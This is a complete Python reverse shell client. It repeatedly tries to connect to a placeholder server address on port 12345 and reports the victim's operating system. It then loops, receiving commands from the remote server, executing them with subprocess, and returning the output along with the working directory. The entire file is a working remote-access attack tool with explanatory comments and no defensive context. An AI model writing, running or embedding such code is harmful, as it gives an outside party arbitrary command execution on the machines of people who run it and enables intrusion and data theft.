#!/usr/bin/python3

import socket
import subprocess
import os
import platform

# Create a socket object for the client using IPv4 and TCP protocol
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Initialize the variable to store the operating system name
os_name = ""

# Attempt to connect to the server until successful
while True:
    try:
        client.connect(("SERVER IP", 12345))
        # Retrieve the operating system name
        os_name = platform.system()
        # Send the operating system name to the server
        client.send(os_name.encode())
        break
    except ConnectionRefusedError:
        pass

try:
    while True:
        # Determine the command to retrieve the current working directory based on the operating system
        if os_name == "Windows":
            loc = "cd"
        elif os_name == "Linux":
            loc = "pwd"

        # Execute the command to retrieve the current working directory
        pwd = subprocess.getoutput(loc)

        # Send the current working directory to the server
        client.send(pwd.encode())

        # Receive the command input from the server
        cmd = (client.recv(1024)).decode()

        # Check if the user wants to exit the shell
        if cmd == "exit":
            break
        # Check if the command is to change directory
        elif cmd.startswith("cd "):
            # Extract the directory path from the command
            directory = cmd.split(" ", 1)[1]
            try:
                # Change the directory
                os.chdir(directory)
                output = f"Changed directory to: {directory}"
            except FileNotFoundError:
                output = f"Directory '{directory}' not found"
            except PermissionError:
                output = f"Permission denied to access directory '{directory}'"

        else:
            try:
                # Execute the command and retrieve the output
                output = subprocess.getoutput(cmd)
            except FileNotFoundError:
                output = f"Command '{cmd}' not found"

        # Append the end of output marker to the output
        output += "\nEND_OF_OUTPUT\n"

        # Send the output back to the server
        client.send(output.encode())
except KeyboardInterrupt:
    # Handle KeyboardInterrupt gracefully
    print("\nExiting due to Keyboard Interrupt.")
except BrokenPipeError:
    # Handle BrokenPipeError when the server closes the connection
    print("\nServer closed the connection.")
finally:
    # Close the client socket
    client.close()
